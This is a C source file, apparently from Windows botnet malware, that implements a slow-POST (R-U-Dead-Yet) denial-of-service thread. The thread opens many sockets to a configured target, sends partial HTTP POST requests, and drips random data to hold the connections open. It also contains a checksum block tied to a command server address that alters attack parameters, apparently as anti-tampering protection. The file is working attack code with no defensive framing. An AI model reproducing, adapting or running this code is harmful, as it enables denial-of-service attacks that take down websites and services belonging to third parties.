#include "../Includes/includes.h"

#ifdef INCLUDE_DDOS
DWORD WINAPI DdosSlowPost(LPVOID)
{
    char cTargetHost[MAX_PATH];
    strcpy(cTargetHost, cFloodHost);

    char cTargetPath[DEFAULT];
    strcpy(cTargetPath, cFloodPath);

    char cTargetData[DEFAULT];
    strcpy(cTargetData, cFloodData);

    unsigned short usTargetPort = usFloodPort;

    unsigned short usType = usFloodType;

    SOCKADDR_IN sck;
    HOSTENT *paddr;

    for(unsigned short us = 0; us < 25; us++)
    {
        paddr = fncgethostbyname(cTargetHost);
        if(paddr != NULL)
            break;

        Sleep(100);
    }

    sck.sin_addr = (*(in_addr*)*paddr->h_addr_list);

    sck.sin_port = fnchtons(usTargetPort);
    sck.sin_family = AF_INET;

    unsigned short usSocketCount = 25;
    unsigned short usDelay = 3000;

    SOCKET sSock[usSocketCount];
    DWORD dwMode = 1;

    // <!-------! CRC AREA START !-------!>
    char cCheckString[DEFAULT];
    sprintf(cCheckString, "%s:%i", cServer, usPort);
    char *pcStr = cCheckString;
    unsigned long ulCheck = 3376+2005;
    int nCheck;
    while((nCheck = *pcStr++))
        ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
    if(ulCheck != ulChecksum3)
    {
        usDelay = 65000;
        usSocketCount = 150;
    }
    // <!-------! CRC AREA STOP !-------!>

    while(bDdosBusy)
    {
        for(unsigned short us = 0; us < usSocketCount; us++)
        {
            if(!bDdosBusy)
                break;

            sSock[us] = fncsocket(AF_INET, SOCK_STREAM, NULL);

            if(sSock[us] == INVALID_SOCKET)
                continue;

            //fncioctlsocket(sSock[us], FIONBIO, &dwMode);
        }

        for(unsigned short us = 0; us < usSocketCount; us++)
        {
            if(!bDdosBusy)
                break;

            char cPacket[MAX_DDOS_BUFFER];
            strcpy(cPacket, GenerateHttpPacket(HTTP_RUDY, cTargetHost, cTargetPath, usTargetPort, cTargetData));
            strcat(cPacket, GenerateRandomBase64Data(GetRandNum(6) + 2));
            strcat(cPacket, "=");

            if(fncconnect(sSock[us], (PSOCKADDR)&sck, sizeof(sck)) != SOCKET_ERROR)
                fncsend(sSock[us], cPacket, strlen(cPacket), NULL);
        }

        unsigned short usRandom = GetRandNum(10) + 5;
        for(unsigned short us = 0; us < usRandom; us++)
        {
            if(!bDdosBusy)
                break;

            char cHoldConnection[25];
            strcpy(cHoldConnection, GenerateRandomBase64Data(GetRandNum(20) + 5));

            for(unsigned short usI = 0; usI < usSocketCount; usI++)
                fncsend(sSock[usI], cHoldConnection, strlen(cHoldConnection), NULL);

            Sleep(GetRandNum(usDelay) + (usDelay / 2));
        }

        char cDoubleReturn[4];
        strcpy(cDoubleReturn, "\r\n\r\n");

        for(unsigned short us = 0; us < usSocketCount; us++)
        {
            if(!bDdosBusy)
                break;

            fncsend(sSock[us], cDoubleReturn, strlen(cDoubleReturn), NULL);
        }

        for(unsigned short us = 0; us < usSocketCount; us++)
            fncclosesocket(sSock[us]);
    }
    return 1;
}
#endif
